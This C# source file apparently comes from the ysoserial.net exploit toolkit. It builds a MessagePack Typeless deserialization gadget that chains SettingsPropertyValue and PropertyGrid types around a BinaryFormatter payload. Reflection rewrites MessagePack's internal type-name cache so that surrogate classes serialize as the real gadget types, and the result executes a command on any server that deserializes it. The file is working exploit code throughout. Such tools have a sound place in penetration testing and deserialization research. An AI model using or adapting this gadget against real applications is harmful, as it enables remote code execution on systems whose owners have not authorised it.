namespace ysoserial.Helpers
{
    using System;
    using System.Reflection;
    using System.Collections.Generic;

    using MessagePack;
    using MessagePack.Formatters;
    using MessagePack.Resolvers;

    using Helpers.SurrogateClasses;

    /// <summary>
    /// Helper methods for generating an GetterSettingsPropertyValue gadget with MessagePack (Typeless)
    /// This version of gadget works for MessagePack >= 2.3.75, but may also work for older versions after some tweaking
    /// </summary>
    internal static class MessagePackGetterSettingsPropertyValueHelper
    {
        /// <summary>
        /// Creates a serialized GetterSettingsPropertyValue gadget that when deserialized will execute the specified command.
        /// </summary>
        /// <param name="binaryFormatterGadget">Binary formatter gadget.</param>
        /// <param name="pUseLz4">Flag to use Lz4 compression. This works with both Lz4Block and Lz4BlockArray.</param>
        /// <returns>The serialized byte array.</returns>
        internal static byte[] CreateGetterSettingsPropertyValueGadget(byte[] binaryFormatterGadget, bool pUseLz4)
        {
            SwapTypeCacheNames(
                new Dictionary<Type, string>
                {
                    {
                        typeof(SettingsPropertyValueSurrogate),
                        "System.Configuration.SettingsPropertyValue, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"
                    },
                    {
                        typeof(PropertyGridSurrogate),
                        "System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"
                    },
                });

            var odpInstance = CreateGetterSettingsPropertyValueSurrogateInstance(binaryFormatterGadget);

            MessagePackSerializerOptions options = pUseLz4
                ? TypelessContractlessStandardResolver.Options.WithCompression(MessagePackCompression.Lz4BlockArray)
                : TypelessContractlessStandardResolver.Options;

            return MessagePackSerializer.Serialize(odpInstance, options);
        }

        /// <summary>
        /// Tests the deserialization of a serialized object.
        /// </summary>
        /// <param name="pSerializedData">The serialized data.</param>
        /// <param name="pUseLz4">Flag to use Lz4 compression. This works with both Lz4Block and Lz4BlockArray.</param>
        internal static void Test(byte[] pSerializedData, bool pUseLz4)
        {
            MessagePackSerializerOptions options = pUseLz4
                ? TypelessContractlessStandardResolver.Options.WithCompression(MessagePackCompression.Lz4BlockArray)
                : TypelessContractlessStandardResolver.Options;

            Object obj = MessagePackSerializer.Deserialize<object>(pSerializedData, options);
        }

        /// <summary>
        /// Utilizes reflection to add values to the internal FullTypeNameCache that MessagePack uses to acquire cached type names for serialization.
        /// This allows us to swap our surrogate GetterSettingsPropertyValue gadget type information with the real gadget AQNs when serialized.
        /// </summary>
        /// <param name="pNewTypeCacheEntries">
        /// The dictionary of type name cache entries to swap. 
        ///     Key = The type that the serializer has found.
        ///     Value = The real gadget type AQN string which we want to use instead of the surrogate type AQN.
        /// </param>
        private static void SwapTypeCacheNames(IDictionary<Type, string> pNewTypeCacheEntries)
        {
            FieldInfo typeNameCacheField = typeof(TypelessFormatter).GetField("FullTypeNameCache", BindingFlags.NonPublic | BindingFlags.Static);
            object typeNameCache = typeNameCacheField.GetValue(TypelessFormatter.Instance);

            MethodInfo method = typeNameCacheField.FieldType.GetMethod("TryAdd", new[] { typeof(Type), typeof(byte[]) });

            foreach (var typeSwap in pNewTypeCacheEntries)
            {
                method.Invoke(typeNameCache,
                    new object[]
                    {
                        typeSwap.Key,
                        System.Text.Encoding.UTF8.GetBytes(typeSwap.Value)
                    });
            }
        }

        /// <summary>
        /// Creates a populated surrogate GetterSettingsPropertyValue instance which matches the object graph of the real GetterSettingsPropertyValue gadget.
        /// </summary>
        /// <param name="binaryFormatterGadget">Binary formatter gadget.</param>
        /// <returns>The full GetterSettingsPropertyValue surrogate object graph.</returns>
        private static object CreateGetterSettingsPropertyValueSurrogateInstance(byte[] binaryFormatterGadget)
        {
            
            return new PropertyGridSurrogate
            {
                SelectedObjects = new object[]
                {
                    new SettingsPropertyValueSurrogate
                    {
                        Deserialized = false,
                        SerializedValue = binaryFormatterGadget   
                    }
                }
            }; 

        }
    }
}
